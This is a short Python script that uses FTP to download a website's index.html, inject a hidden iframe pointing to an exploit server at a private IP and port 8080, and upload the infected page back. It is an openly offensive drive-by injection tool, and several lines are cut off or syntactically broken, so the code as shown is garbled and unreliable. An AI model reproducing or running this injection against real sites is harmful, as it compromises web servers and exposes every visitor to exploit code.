from ftplib import FTP

redirect = '<iframe src="http://10.10.10.112:8080/exploit">

file = open('index.html.tmp', 'w')
file.write(redirect)
print('[+] Prepared Injection for: index.html')

ftp = FTP()
ftp.connect('192.168.43.52', port=8021)
ftp.retrlines('RETR ' + 'index.html', lambda s, w = file.w>
print('[+] Downloaded Page: index.html')
file.close()

ftp.storlines('STOR ' + 'index.html', open('index.html.tmp>
print('[+] Uploaded Injected Page: index.html')
file.close()
ftp.close()
